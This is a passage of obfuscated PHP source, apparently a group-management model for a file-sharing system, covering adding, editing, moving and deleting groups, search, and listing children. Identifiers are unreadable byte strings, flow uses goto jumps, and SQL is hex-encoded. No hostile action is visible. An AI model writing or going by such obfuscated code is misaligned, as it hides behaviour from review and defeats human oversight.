($A›ñíš¼ä = $this->getInfoSimple($dºËóŞ à[$CÂšŒˆ„³¶[2107]], !0)) { return $dºËóŞ à[$CÂšŒˆ„³¶[2107]]; } } else { $A›ñíš¼ä = $this->getInfoSimple($dºËóŞ à[$CÂšŒˆ„³¶[461]]); if (!$A›ñíš¼ä) { return !1; } } $f¾‹®îòÇì = $CÂšŒˆ„³¶[470]; goto B²ÄÏˆ°Ê; c˜Ä„ÀÕÚ: Model($CÂšŒˆ„³¶[1118])->groupRootAdd($FÒ‘ŒÏÃ†); return $FÒ‘ŒÏÃ†; goto eëÎÕ¸¨Ñ‘; DÎ¡“Ú»Ôô: if (!empty($dºËóŞ à[$CÂšŒˆ„³¶[2107]])) { $D¹ÁÑÃ°‡[$CÂšŒˆ„³¶[2107]] = $dºËóŞ à[$CÂšŒˆ„³¶[2107]]; } $FÒ‘ŒÏÃ† = $this->add($D¹ÁÑÃ°‡); $this->setNamePinyin($FÒ‘ŒÏÃ†, $D¹ÁÑÃ°‡[$CÂšŒˆ„³¶[28]]); goto c˜Ä„ÀÕÚ; B²ÄÏˆ°Ê: if ($A›ñíš¼ä[$CÂšŒˆ„³¶[459]]) { $f¾‹®îòÇì = $A›ñíš¼ä[$CÂšŒˆ„³¶[459]] . $A›ñíš¼ä[$CÂšŒˆ„³¶[2107]] . $CÂšŒˆ„³¶[47]; } $D¹ÁÑÃ°‡ = array($CÂšŒˆ„³¶[386] => $this->groupNameAuto($dºËóŞ à[$CÂšŒˆ„³¶[461]], $dºËóŞ à[$CÂšŒˆ„³¶[28]]), $CÂšŒˆ„³¶[368] => $dºËóŞ à[$CÂšŒˆ„³¶[461]], $CÂšŒˆ„³¶[525] => $f¾‹®îòÇì, $CÂšŒˆ„³¶[2177] => $dºËóŞ à[$CÂšŒˆ„³¶[2091]], $CÂšŒˆ„³¶[2178] => 0, $CÂšŒˆ„³¶[2111] => 0); if (isset($dºËóŞ à[$CÂšŒˆ„³¶[2128]])) { $D¹ÁÑÃ°‡[$CÂšŒˆ„³¶[2128]] = $dºËóŞ à[$CÂšŒˆ„³¶[2128]]; } else { $E…„¶é™­ = $this->max($CÂšŒˆ„³¶[2128]); if (!$E…„¶é™­) { $E…„¶é™­ = 0; } $D¹ÁÑÃ°‡[$CÂšŒˆ„³¶[2128]] = $E…„¶é™­ + 1; } goto DÎ¡“Ú»Ôô; eëÎÕ¸¨Ñ‘: } protected function groupEdit($dØ‘Åà¡ÑÀ, $E”á«Ö¯˜) { $aŠŠÍÕÇ“¶ =& $_SERVER[‚Ğ°–—î]; if (!empty($E”á«Ö¯˜[$aŠŠÍÕÇ“¶[461]])) { $E´™ˆÎ·ëÀ = $this->getInfoSimple($dØ‘Åà¡ÑÀ); $aÕÈÆõÊâˆ = $this->getInfoSimple($E”á«Ö¯˜[$aŠŠÍÕÇ“¶[461]]); if (!$E´™ˆÎ·ëÀ || !$aÕÈÆõÊâˆ) { return !1; } if ($E´™ˆÎ·ëÀ[$aŠŠÍÕÇ“¶[2107]] == $aÕÈÆõÊâˆ[$aŠŠÍÕÇ“¶[2107]]) { return !1; } if ($E”á«Ö¯˜[$aŠŠÍÕÇ“¶[461]] != $E´™ˆÎ·ëÀ[$aŠŠÍÕÇ“¶[461]]) { if ($aÕÈÆõÊâˆ[$aŠŠÍÕÇ“¶[459]] !== $E´™ˆÎ·ëÀ[$aŠŠÍÕÇ“¶[459]] && strpos($aÕÈÆõÊâˆ[$aŠŠÍÕÇ“¶[459]], $E´™ˆÎ·ëÀ[$aŠŠÍÕÇ“¶[459]] . $E´™ˆÎ·ëÀ[$aŠŠÍÕÇ“¶[2107]] . $aŠŠÍÕÇ“¶[47]) === 0) { return !1; } $E”á«Ö¯˜[$aŠŠÍÕÇ“¶[525]] = $aÕÈÆõÊâˆ[$aŠŠÍÕÇ“¶[459]] . $E”á«Ö¯˜[$aŠŠÍÕÇ“¶[461]] . $aŠŠÍÕÇ“¶[47]; $this->_changeChildLevel($E´™ˆÎ·ëÀ, $aÕÈÆõÊâˆ); } } if (isset($E”á«Ö¯˜[$aŠŠÍÕÇ“¶[28]])) { $this->setNamePinyin($dØ‘Åà¡ÑÀ, $E”á«Ö¯˜[$aŠŠÍÕÇ“¶[28]]); } return $this->where(array($aŠŠÍÕÇ“¶[2179] => $dØ‘Åà¡ÑÀ))->save($E”á«Ö¯˜); } private function _changeChildLevel($eĞæ’Ùò‡, $fŒ¡¼ãÓœ—, $D‚Çç›™¬Š = false) { goto e–ˆ‘íª“; c‘Ş”¼ØÔ: if ($D‚Çç›™¬Š) { $E–çÌå¿â = $fŒ¡¼ãÓœ—[$E’·¼†‹ñã[459]] . $fŒ¡¼ãÓœ—[$E’·¼†‹ñã[2107]] . $E’·¼†‹ñã[47]; } $fÁŞæê¤Á¾ = array($E’·¼†‹ñã[525] => array($E’·¼†‹ñã[483], $eĞæ’Ùò‡[$E’·¼†‹ñã[459]] . $eĞæ’Ùò‡[$E’·¼†‹ñã[2107]] . $E’·¼†‹ñã[484])); $Fµæ‡Ñç¨ = array($E’·¼†‹ñã[525] => array($E’·¼†‹ñã[534], "\162\145\160\x6c\x61\x63\x65\x28\160\x61\x72\145\156\x74\x4c\145\166\x65\x6c\x2c\x27{$F—–ŒÈß‰µ}\x27\x2c\x27{$E–çÌå¿â}\47\51")); goto b‚öÜ²›æ›; b‚öÜ²›æ›: $this->where($fÁŞæê¤Á¾)->data($Fµæ‡Ñç¨)->save(); goto d¿„÷Áèá; e–ˆ‘íª“: $E’·¼†‹ñã =& $_SERVER[‚Ğ°–—î]; $F—–ŒÈß‰µ = $eĞæ’Ùò‡[$E’·¼†‹ñã[459]] . $eĞæ’Ùò‡[$E’·¼†‹ñã[2107]] . $E’·¼†‹ñã[47]; $E–çÌå¿â = $fŒ¡¼ãÓœ—[$E’·¼†‹ñã[459]] . $fŒ¡¼ãÓœ—[$E’·¼†‹ñã[2107]] . $E’·¼†‹ñã[47] . $eĞæ’Ùò‡[$E’·¼†‹ñã[2107]] . $E’·¼†‹ñã[47]; goto c‘Ş”¼ØÔ; d¿„÷Áèá: } public function setNamePinyin($DÕÎÅ†´†Û, $dô£…ÜÓñõ = false) { $c×ŠàíÇŒÉ =& $_SERVER[‚Ğ°–—î]; if (!$dô£…ÜÓñõ) { $C‰³¦¬·¯ä = $this->getInfoSimple($DÕÎÅ†´†Û); $dô£…ÜÓñõ = $C‰³¦¬·¯ä[$c×ŠàíÇŒÉ[28]]; } if (!Input::check($dô£…ÜÓñõ, $c×ŠàíÇŒÉ[528])) { $this->metaSet($DÕÎÅ†´†Û, $c×ŠàíÇŒÉ[416], null); $this->metaSet($DÕÎÅ†´†Û, $c×ŠàíÇŒÉ[415], null); return; } $d±‚ÂÌ¤Ì´ = array($c×ŠàíÇŒÉ[416] => str_replace($c×ŠàíÇŒÉ[50], $c×ŠàíÇŒÉ[33], Pinyin::encode($dô£…ÜÓñõ)), $c×ŠàíÇŒÉ[415] => Pinyin::encode($dô£…ÜÓñõ, $c×ŠàíÇŒÉ[529])); $this->metaSet($DÕÎÅ†´†Û, $d±‚ÂÌ¤Ì´); } protected function groupStatus($eÒ«õæ‡Ç, $E´Ô¯«‚¶†) { goto a—÷ö­ñ©„; a—÷ö­ñ©„: $bæ²ÌğñÏ =& $_SERVER[‚Ğ°–—î]; $f¦éá¾œğ = $this->getInfoSimple($eÒ«õæ‡Ç); if (!$f¦éá¾œğ) { return !1; } goto Cá‹ãõ‘¥Ò; Döù’½öµ: foreach ($CÀ‰Íš¥È as $eÒ«õæ‡Ç) { $eŸ“Š®Ş¢[] = array($bæ²ÌğñÏ[2107] => $eÒ«õæ‡Ç, $bæ²ÌğñÏ[89] => $bæ²ÌğñÏ[688], $bæ²ÌğñÏ[359] => $E´Ô¯«‚¶†); } return Model($bæ²ÌğñÏ[2180])->addAll($eŸ“Š®Ş¢, array(), !0); goto AØƒÈÇªŠ; Cá‹ãõ‘¥Ò: if ($E´Ô¯«‚¶† == $bæ²ÌğñÏ[83]) { $CÀ‰Íš¥È = $this->parentLevelArray($f¦éá¾œğ[$bæ²ÌğñÏ[459]]); } else { $fç·ôÉ»øÏ = array($bæ²ÌğñÏ[525] => array($bæ²ÌğñÏ[483], $f¦éá¾œğ[$bæ²ÌğñÏ[459]] . $f¦éá¾œğ[$bæ²ÌğñÏ[2107]] . $bæ²ÌğñÏ[484])); $CÀ‰Íš¥È = $this->where($fç·ôÉ»øÏ)->field($bæ²ÌğñÏ[2107])->select(); $CÀ‰Íš¥È = array_to_keyvalue($CÀ‰Íš¥È, $bæ²ÌğñÏ[33], $bæ²ÌğñÏ[2107]); } $CÀ‰Íš¥È[] = $f¦éá¾œğ[$bæ²ÌğñÏ[2107]]; $eŸ“Š®Ş¢ = array(); goto Döù’½öµ; AØƒÈÇªŠ: } private function _groupStatusApply($d©î½È±Æ, $B¡åæËÒĞÏ) { $F÷½ÛÏ–ÚÆ =& $_SERVER[‚Ğ°–—î]; if ($B¡åæËÒĞÏ == $F÷½ÛÏ–ÚÆ[83]) { $A¬œå·óÖ¬ = $this->parentLevelArray($d©î½È±Æ[$F÷½ÛÏ–ÚÆ[459]]); } else { $B±¤ ‹–Á = array($F÷½ÛÏ–ÚÆ[525] => array($F÷½ÛÏ–ÚÆ[483], $d©î½È±Æ[$F÷½ÛÏ–ÚÆ[459]] . $d©î½È±Æ[$F÷½ÛÏ–ÚÆ[2107]] . $F÷½ÛÏ–ÚÆ[484])); $A¬œå·óÖ¬ = $this->where($B±¤ ‹–Á)->field($F÷½ÛÏ–ÚÆ[2107])->select(); $A¬œå·óÖ¬ = array_to_keyvalue($A¬œå·óÖ¬, $F÷½ÛÏ–ÚÆ[33], $F÷½ÛÏ–ÚÆ[2107]); } if (empty($A¬œå·óÖ¬)) { return; } $c…Â…ˆ¬× = array(); foreach ($A¬œå·óÖ¬ as $b›»‹†öˆß) { $c…Â…ˆ¬×[] = array($F÷½ÛÏ–ÚÆ[2107] => $b›»‹†öˆß, $F÷½ÛÏ–ÚÆ[89] => $F÷½ÛÏ–ÚÆ[688], $F÷½ÛÏ–ÚÆ[359] => $B¡åæËÒĞÏ); } Model($F÷½ÛÏ–ÚÆ[2180])->addAll($c…Â…ˆ¬×, array(), !0); } protected function groupRemove($eÒ˜ÏíòËÚ) { goto DÌ´´‚–¿È; DÌ´´‚–¿È: $AÑİ«¸—Ù‹ =& $_SERVER[‚Ğ°–—î]; $bñï…º„¿µ = array($AÑİ«¸—Ù‹[2107] => $eÒ˜ÏíòËÚ); $DšŠÁæ¬¿ = $this->where($bñï…º„¿µ)->find(); goto aÑ˜Â•ñÍ­; aÑ˜Â•ñÍ­: if (!$DšŠÁæ¬¿ || $DšŠÁæ¬¿[$AÑİ«¸—Ù‹[461]] == 0) { return !1; } $A´‰Şˆ”ÃÅ = $this->getInfoSimple($DšŠÁæ¬¿[$AÑİ«¸—Ù‹[461]]); $this->_changeChildLevel($DšŠÁæ¬¿, $A´‰Şˆ”ÃÅ, !0); goto eÀôâÅ…ö; a¶Ìó÷¬òã: Model($AÑİ«¸—Ù‹[752])->groupRootRemove($eÒ˜ÏíòËÚ); return $this->where($bñï…º„¿µ)->delete(); goto d«¡•ñ¥“æ; eÀôâÅ…ö: $this->where(array($AÑİ«¸—Ù‹[461] => $eÒ˜ÏíòËÚ))->save(array($AÑİ«¸—Ù‹[461] => $DšŠÁæ¬¿[$AÑİ«¸—Ù‹[461]])); Model($AÑİ«¸—Ù‹[2180])->where($bñï…º„¿µ)->delete(); Model($AÑİ«¸—Ù‹[2181])->where($bñï…º„¿µ)->delete(); goto a¶Ìó÷¬òã; d«¡•ñ¥“æ: } protected function groupSort($dÍõ»âÒ›‹) { $bµÜî‘Ô‡— =& $_SERVER[‚Ğ°–—î]; $b°ËÂŠŠ¡ù = array(); foreach ($dÍõ»âÒ›‹ as $ešö°ÔÇ¬ => $D­†ëÏ†ÛÒ) { $b°ËÂŠŠ¡ù[] = array($bµÜî‘Ô‡—[2107], $D­†ëÏ†ÛÒ, $bµÜî‘Ô‡—[2128], $ešö°ÔÇ¬ + 1); } $this->saveAll($b°ËÂŠŠ¡ù); } public function listData() { $fŒãäÑŠšª = $this->_makeOrder()->selectPage(50); $this->_listDataApply($fŒãäÑŠšª[$_SERVER[‚Ğ°–—î][354]]); return $fŒãäÑŠšª; } private function _makeOrder($FÍÙ¶Û™¡é = '') { goto b·ƒàïš; c¶Ô¹äï­ö: $FÍÙ¶Û™¡é = $FÍÙ¶Û™¡é . "{$EóĞ‚¦ø‡¦}\x20{$A´‰ãÕãˆã}\54\x20\147\x72\x6f\x75\x70\x49\x44\x20\141\163\x63"; return $this->order($FÍÙ¶Û™¡é); goto a™ô……Îˆù; b·ƒàïš: $a—Ó¼òñ„• =& $_SERVER[‚Ğ°–—î]; $BïÓ¬ƒî“‘ = array($a—Ó¼òñ„•[2107], $a—Ó¼òñ„•[28], $a—Ó¼òñ„•[2093], $a—Ó¼òñ„•[187]); $C¬Ÿªá’‚ï = array($a—Ó¼òñ„•[402] => $a—Ó¼òñ„•[403], $a—Ó¼òñ„•[404] => $a—Ó¼òñ„•[405]); goto dœØÄ•ãÓ; dœØÄ•ãÓ: $EóĞ‚¦ø‡¦ = Input::get($a—Ó¼òñ„•[407], $a—Ó¼òñ„•[7], $a—Ó¼òñ„•[2111], $BïÓ¬ƒî“‘); $A´‰ãÕãˆã = Input::get($a—Ó¼òñ„•[408], $a—Ó¼òñ„•[7], $a—Ó¼òñ„•[2182], array($a—Ó¼òñ„•[2182], $a—Ó¼òñ„•[404])); $A´‰ãÕãˆã = $C¬Ÿªá’‚ï[$A´‰ãÕãˆã]; goto c¶Ô¹äï­ö; a™ô……Îˆù: } public function listChild($e«À¿‘çÎ£) { $DÇÚ®ÅÂó™ =& $_SERVER[‚Ğ°–—î]; $aß¯›Àİ¦Ñ = $this->where(array($DÇÚ®ÅÂó™[461] => $e«À¿‘çÎ£))->_makeOrder()->selectPage(200); $this->_listDataApply($aß¯›Àİ¦Ñ[$DÇÚ®ÅÂó™[354]]); return $aß¯›Àİ¦Ñ; } public function listByID($d›ª®Ğªñ) { $Fî¤ğ¹¡Ó =& $_SERVER[‚Ğ°–—î]; if (!$d›ª®Ğªñ) { return array(); } $e¦Ù¸İ°á = array($Fî¤ğ¹¡Ó[2107] => array($Fî¤ğ¹¡Ó[7], $d›ª®Ğªñ)); $F¯ì¤Á÷½¨ = $this->where($e¦Ù¸İ°á)->select(); $this->_listDataApply($F¯ì¤Á÷½¨); return $F¯ì¤Á÷½¨; } public function listSearch($Dİ¾ò§³ÚÙ) { goto eÕîŠ†İ¦„; FÃ Ùç×Â: $this->_listDataApply($dàí½ß‡Š¥[$eõÎµ…‡¡à[354]]); return $dàí½ß‡Š¥; goto fñè£®ÁËù; cÄ¡ñïôğ¶: $dàí½ß‡Š¥ = $this->_makeOrder()->where($D»ğñöĞ‰„)->selectPage(20); $dàí½ß‡Š¥ = $dàí½ß‡Š¥ ? $dàí½ß‡Š¥ : array(); if (!$dàí½ß‡Š¥ || count($dàí½ß‡Š¥[$eõÎµ…‡¡à[354]]) < 5 && Input::check($BĞŠ·®Úõ, $eõÎµ…‡¡à[306])) { $FÆõ¼×‰Ï = $this->_searchFromMeta($eõÎµ…‡¡à[415], $BĞŠ·®Úõ, 10); $D°‘ÜÚœ‰× = $this->_searchFromMeta($eõÎµ…‡¡à[416], $BĞŠ·®Úõ, 10); $D¯æ‹Áó = array_merge($FÆõ¼×‰Ï, $D°‘ÜÚœ‰×, $dàí½ß‡Š¥[$eõÎµ…‡¡à[354]]); $dàí½ß‡Š¥[$eõÎµ…‡¡à[354]] = array_unique_by_key($D¯æ‹Áó, $eõÎµ…‡¡à[2107]); $dàí½ß‡Š¥[$eõÎµ…‡¡à[351]][$eõÎµ…‡¡à[352]] = count($dàí½ß‡Š¥[$eõÎµ…‡¡à[354]]); $dàí½ß‡Š¥[$eõÎµ…‡¡à[351]][$eõÎµ…‡¡à[353]] = ceil($dàí½ß‡Š¥[$eõÎµ…‡¡à[351]][$eõÎµ…‡¡à[352]] / $dàí½ß‡Š¥[$eõÎµ…‡¡à[351]][$eõÎµ…‡¡à[349]]); } goto FÃ Ùç×Â; eÕîŠ†İ¦„: $eõÎµ…‡¡à =& $_SERVER[‚Ğ°–—î]; $BĞŠ·®Úõ = $Dİ¾ò§³ÚÙ[$eõÎµ…‡¡à[2183]]; $EŠî•ŠîàË = isset($Dİ¾ò§³ÚÙ[$eõÎµ…‡¡à[2184]]) ? $Dİ¾ò§³ÚÙ[$eõÎµ…‡¡à[2184]] : !1; goto EêİµàóÊó; EêİµàóÊó: if (!trim($BĞŠ·®Úõ)) { return !1; } $BĞŠ·®Úõ = str_replace($eõÎµ…‡¡à[2185], $eõÎµ…‡¡à[2186], $BĞŠ·®Úõ); $D»ğñöĞ‰„ = array($eõÎµ…‡¡à[2107] => array($eõÎµ…‡¡à[751], "\45{$BĞŠ·®Úõ}\x25"), $eõÎµ…‡¡à[28] => array($eõÎµ…‡¡à[751], "\45{$BĞŠ·®Úõ}\45"), $eõÎµ…‡¡à[915] => $eõÎµ…‡¡à[2187]); goto cÄ¡ñïôğ¶; fñè£®ÁËù: } private function _searchFromMeta($c¿Øğ­ºİ›, $càÊç›ã¬Ì, $FÅ…œ¨Âôß) { goto f¹À¦®Åò; F±¨’ÒßĞÁ: $fÔéóÉ±àÃ = Model($B’©ô—Œ’í[2188])->where($aİ„“§Áí)->limit($FÅ…œ¨Âôß)->select(); if (!$fÔéóÉ±àÃ) { return array(); } $fÔéóÉ±àÃ = array_to_keyvalue($fÔéóÉ±àÃ, $B’©ô—Œ’í[33], $B’©ô—Œ’í[2107]); goto A»‰£³†­¾; A»‰£³†­¾: $A¼ØÀä‹‚— = $this->where(array($B’©ô—Œ’í[2179] => array($B’©ô—Œ’í[7], $fÔéóÉ±àÃ)))->select(); if (!$A¼ØÀä‹‚—) { return array(); } return $A¼ØÀä‹‚—; goto Aè†²ÏÛÑ§; f¹À¦®Åò: $B’©ô—Œ’í =& $_SERVER[‚Ğ°–—î]; $càÊç›ã¬Ì = strtolower($càÊç›ã¬Ì); $aİ„“§Áí = array($B’©ô—Œ’í[89] => $c¿Øğ­ºİ›, $B’©ô—Œ’í[359] => array($B’©ô—Œ’í[751], "\x25{$càÊç›ã¬Ì}\45")); goto F±¨’ÒßĞÁ; Aè†²ÏÛÑ§: } protected function _listDataApplyItem($AÏÖÔ·ø¿) { $eîƒŒ§ãäß = array($AÏÖÔ·ø¿); $this->_listDataApply($eîƒŒ§ãäß); return $eîƒŒ§ãäß[0]; } protected function _listDataApply(&$DİÙ¬è) { goto E¾Ø½šæ×Â; D÷‡»‹: $this->_listAppendParent($DİÙ¬è); $this->_listAppendSourceRoot($DİÙ¬è, $aÚé¾¾ôÖ); goto f”İîªçÓˆ; E¾Ø½šæ×Â: $cÙç³Óöñµ =& $_SERVER[‚Ğ°–—î]; if (!$DİÙ¬è) { return; } $aÚé¾¾ôÖ = array_to_keyvalue($DİÙ¬è, $cÙç³Óöñµ[33], $cÙç³Óöñµ[2107]); goto AÄÜ¡à‡î; AÄÜ¡à‡î: $this->_listAppendChildren($DİÙ¬è); $this->_listAppendChildrenMember($DİÙ¬è); $this->_listAppendMeta($DİÙ¬è, $aÚé¾¾ôÖ); goto D÷‡»‹; f”İîªçÓˆ: } private function _listAppendChildren(&$C„Ğ‡ˆ™àª) { goto EŒà„¿–ğà; ağ‰Ê³³ÁÕ: $bØÁ¯½‡á® = count($C„Ğ‡ˆ™àª); $AÏÁ·ÛßÔ = $this->tablePrefix . $this->tableName; for ($BŒ®Û¹¨÷é = 0, $b‹¤öòÑ¨ = 0; $BŒ®Û¹¨÷é < $bØÁ¯½‡á®; $BŒ®Û¹¨÷é++) { $b‹¤öòÑ¨++; $A­ÔòÄáÕä = $C„Ğ‡ˆ™àª[$BŒ®Û¹¨÷é][$a‰§ŒµÈ¸ä[2107]]; $A±­î¸Ÿê† .= "\x53\x45\x4c\105\x43\x54\40\x2a\x20\106\x52\x4f\115\x20\x28\x53\105\x4c\105\103\124\40\x27{$A­ÔòÄáÕä}\137\143\150\x69\x6c\x64\47\40\141\x73\40\150\x61\163\40\106\122\x4f\115\x20\140{$AÏÁ·ÛßÔ}\x60\40\x77\150\x65\162\145\40\x70\x61\162\145\x6e\164\x49\104\x3d{$A­ÔòÄáÕä}\40\x6c\x69\155\x69\164\x20\x31\51\40\141\163\40\164\x62\137{$A­ÔòÄáÕä}\40\x75\156\x69\x6f\156\x20\141\154\154\x20"; if (($b‹¤öòÑ¨ >= 20 || $BŒ®Û¹¨÷é == $bØÁ¯½‡á® - 1) && $A±­î¸Ÿê†) { $A±­î¸Ÿê† = substr($A±­î¸Ÿê†, 0, -strlen($a‰§ŒµÈ¸ä[449])); $eŞÃš´¹ÒÑ = $this->query($A±­î¸Ÿê†); $f¾ˆ—å°¿  = array_merge($f¾ˆ—å°¿ , $eŞÃš´¹ÒÑ); $b‹¤öòÑ¨ = 0; $A±­î¸Ÿê† = $a‰§ŒµÈ¸ä[33]; } } goto d¿îæ£ª¯; EŒà„¿–ğà: $a‰§ŒµÈ¸ä =& $_SERVER[‚Ğ°–—î]; $A±­î¸Ÿê† = $a‰§ŒµÈ¸ä[361]; $f¾ˆ—å°¿  = array(); goto ağ‰Ê³³ÁÕ; d¿îæ£ª¯: $f¾ˆ—å°¿  = array_to_keyvalue($f¾ˆ—å°¿ , $a‰§ŒµÈ¸ä[450]); foreach ($C„Ğ‡ˆ™àª as &$fĞß‘µõö’) { $fĞß‘µõö’[$a‰§ŒµÈ¸ä[2189]] = isset($f¾ˆ—å°¿ [$fĞß‘µõö’[$a‰§ŒµÈ¸ä[2107]] . $a‰§ŒµÈ¸ä[2190]]); } goto Eé…¥¦·¾¼; Eé…¥¦·¾¼: } private function _listAppendChildrenMember(&$DãªòÚÃ¬İ) { goto fÄŸÖÌõ§; DÓá÷“ï›: $aôÔ»¾¬ÒÀ = count($DãªòÚÃ¬İ); $bˆõÀÇëîñ = $this->tablePrefix . $AÑ–˜ï¸[2181]; for ($fãã‹ĞŸ‡ø = 0, $EˆášÑË— = 0; $fãã‹ĞŸ‡ø < $aôÔ»¾¬ÒÀ; $fãã‹ĞŸ‡ø++) { $EˆášÑË—++; $b‰·Û¶›… = $DãªòÚÃ¬İ[$fãã‹ĞŸ‡ø][$AÑ–˜ï¸[2107]]; $eÆÔ„ÁÎè„ .= "\123\105\x4c\105\103\124\40\52\40\x46\122\x4f\115\x20\x28\x53\105\x4c\105\103\x54\40\x27{$b‰·Û¶›…}\x5f\143\150\151\154\x64\47\40\141\x73\40\x68\x61\163\x20\106\x52\x4f\115\40\x60{$bˆõÀÇëîñ}\140\40\167\150\145\x72\x65\x20\x67\162\x6f\x75\x70\111\104\75{$b‰·Û¶›…}\40\154\151\x6d\x69\164\40\x31\51\x20\141\x73\x20\164\x62\x5f{$b‰·Û¶›…}\40\x75\156\151\x6f\156\x20\x61\x6c\x6c\40"; if (($EˆášÑË— >= 20 || $fãã‹ĞŸ‡ø == $aôÔ»¾¬ÒÀ - 1) && $eÆÔ„ÁÎè„) { $eÆÔ„ÁÎè„ = substr($eÆÔ„ÁÎè„, 0, -strlen($AÑ–˜ï¸[449])); $fÛ¿±½º§· = $this->query($eÆÔ„ÁÎè„); $d†•‰Õº¸Æ = array_merge($d†•‰Õº¸Æ, $fÛ¿±½º§·); $EˆášÑË— = 0; $eÆÔ„ÁÎè„ = $AÑ–˜ï¸[33]; } } goto eµœâ¹ĞÈï; eµœâ¹ĞÈï: $d†•‰Õº¸Æ = array_to_keyvalue($d†•‰Õº¸Æ, $AÑ–˜ï¸[450]); foreach ($DãªòÚÃ¬İ as &$e…Òíôëµ§) { $e…Òíôëµ§[$AÑ–˜ï¸[2191]] = isset($d†•‰Õº¸Æ[$e…Òíôëµ§[$AÑ–˜ï¸[2107]] . $AÑ–˜ï¸[2190]]); } goto bŠÙá¥Åà»; fÄŸÖÌõ§: $AÑ–˜ï¸ =& $_SERVER[‚Ğ°–—î]; $eÆÔ„ÁÎè„ = $AÑ–˜ï¸[361]; $d†•‰Õº¸Æ = array(); goto DÓá÷“ï›; bŠÙá¥Åà»: } private function _listAppendMeta(&$Dáà»†¯–, $A©³ÈÛÍàŸ) { $eŠøÏåÆâÂ =& $_SERVER[‚Ğ°–—î]; $dù…­›‹» = array($eŠøÏåÆâÂ[2107] => array($eŠøÏåÆâÂ[7], $A©³ÈÛÍàŸ)); $d‹Ò¸ÂâÃÉ = Model($eŠøÏåÆâÂ[2180])->where($dù…­›‹»)->select(); $d‹Ò¸ÂâÃÉ = array_to_keyvalue_group($d‹Ò¸ÂâÃÉ, $eŠøÏåÆâÂ[2107]); foreach ($d‹Ò¸ÂâÃÉ as &$d§ÒÚ™ªù) { $d§ÒÚ™ªù = array_to_keyvalue($d§ÒÚ™ªù, $eŠøÏåÆâÂ[89], $eŠøÏåÆâÂ[359]); } foreach ($Dáà»†¯– as &$cøšÀÌæŠÀ) { $cøšÀÌæŠÀ[$eŠøÏåÆâÂ[417]] = array(); if (isset($d‹Ò¸ÂâÃÉ[$cøšÀÌæŠÀ[$eŠøÏåÆâÂ[2107]]])) { $cøšÀÌæŠÀ[$eŠøÏåÆâÂ[417]] = $d‹Ò¸ÂâÃÉ[$cøšÀÌæŠÀ[$eŠøÏåÆâÂ[2107]]]; } } } protected function parentLevelArray($BÈãŸ·¤ŞŠ) { $Aòø•èóƒÊ =& $_SERVER[‚Ğ°–—î]; $BÈãŸ·¤ŞŠ = explode($Aòø•èóƒÊ[47], trim($BÈãŸ·¤ŞŠ, $Aòø•èóƒÊ[47])); $BÈãŸ·¤ŞŠ = array_remove_value($BÈãŸ·¤ŞŠ, $Aòø•èóƒÊ[468]); return $BÈãŸ·¤ŞŠ; } private function _listAppendParent(&$A­¦õğ–Çä) { goto açØŞÁîÁñ; Eñ‰¤ºå»: foreach ($A­¦õğ–Çä as &$F’¢§ÇÈ×ê) { $aƒÎÅ÷éºÕ = $this->parentLevelArray($F’¢§ÇÈ×ê[$aÒ™ò™¨Óì[459]]); $FßãÆİÄ¦ = $aÒ™ò™¨Óì[33]; foreach ($aƒÎÅ÷éºÕ as $B‚ë…¸œø¿) { $FßãÆİÄ¦ .= $Aíª½‘ïŠù[$B‚ë…¸œø¿] . $aÒ™ò™¨Óì[8]; } if ($aƒÎÅ÷éºÕ) { $FßãÆİÄ¦ .= $F’¢§ÇÈ×ê[$aÒ™ò™¨Óì[28]]; } $F’¢§ÇÈ×ê[$aÒ™ò™¨Óì[463]] = str_replace($aÒ™ò™¨Óì[467], $aÒ™ò™¨Óì[8], $FßãÆİÄ¦); } goto CËÎµ­¿°–; açØŞÁîÁñ: $aÒ™ò™¨Óì =& $_SERVER[‚Ğ°–—î]; $Aíª½‘ïŠù = array(); foreach ($A­¦õğ–Çä as &$F’¢§ÇÈ×ê) { $Aíª½‘ïŠù[$F’¢§ÇÈ×ê[$aÒ™ò™¨Óì[2107]]] = $F’¢§ÇÈ×ê[$aÒ™ò™¨Óì[28]]; $aƒÎÅ÷éºÕ = $this->parentLevelArray($F’¢§ÇÈ×ê[$aÒ™ò™¨Óì[459]]); foreach ($aƒÎÅ÷éºÕ as $B‚ë…¸œø¿) { if (!isset($Aíª½‘ïŠù[$B‚ë…¸œø¿])) { $Aíª½‘ïŠù[$B‚ë…¸œø¿] = 0; } } } goto aİÅÂôô™„; aİÅÂôô™„: $c¿ë„ˆùî = array(); foreach ($Aíª½‘ïŠù as $ağôíÅÅ¡  => $f§¡ç¹ìÍ™) { if (!$f§¡ç¹ìÍ™) { $c¿ë„ˆùî[] = $ağôíÅÅ¡ ; } } if ($c¿ë„ˆùî) { $e™ĞĞ…ùŠí = array($aÒ™ò™¨Óì[2179] => array($aÒ™ò™¨Óì[384], $c¿ë„ˆùî)); $dé¤©¼˜ê = $this->field($aÒ™ò™¨Óì[2192])->where($e™ĞĞ…ùŠí)->select(); $b‚Å²ÙŒŞ = array_to_keyvalue($dé¤©¼˜ê, $aÒ™ò™¨Óì[2107], $aÒ™ò™¨Óì[28]); $Aíª½‘ïŠù = array_merge_index($Aíª½‘ïŠù, $b‚Å²ÙŒŞ); } goto Eñ‰¤ºå»; CËÎµ­¿°–: } private function _listAppendSourceRoot(&$Dò†åøõÈÒ, $AÕ›£ˆ×Ÿ†) { goto eÎóµÀØ‰…; d¼ßæ‚ÈÓ´: $F¶ÃôÆòŠ¼ = Model($d°²ºæ‡…½[752])->order($d°²ºæ‡…½[2194])->field($dïÆŒŒ½˜)->where($F÷Ó©ŠÌ¨ƒ)->select(); $F¶ÃôÆòŠ¼ = array_to_keyvalue($F¶ÃôÆòŠ¼, $d°²ºæ‡…½[456]); $F¶ÃôÆòŠ¼ = array_remove_key($F¶ÃôÆòŠ¼, $d°²ºæ‡…½[456]); goto A„ˆÕ¹–”¢; eÎóµÀØ‰…: $d°²ºæ‡…½ =& $_SERVER[‚Ğ°–—î]; $F÷Ó©ŠÌ¨ƒ = array($d°²ºæ‡…½[371] => SourceModel::TYPE_GROUP, $d°²ºæ‡…½[461] => 0, $d°²ºæ‡…½[456] => array($d°²ºæ‡…½[7], $AÕ›£ˆ×Ÿ†)); $dïÆŒŒ½˜ = $d°²ºæ‡…½[2193]; goto d¼ßæ‚ÈÓ´; A„ˆÕ¹–”¢: foreach ($Dò†åøõÈÒ as &$C¶Ì¯Ø¢ê) { $C¶Ì¯Ø¢ê[$d°²ºæ‡…½[391]] = $F¶ÃôÆòŠ¼[$C¶Ì¯Ø¢ê[$d°²ºæ‡…½[2107]]] ? 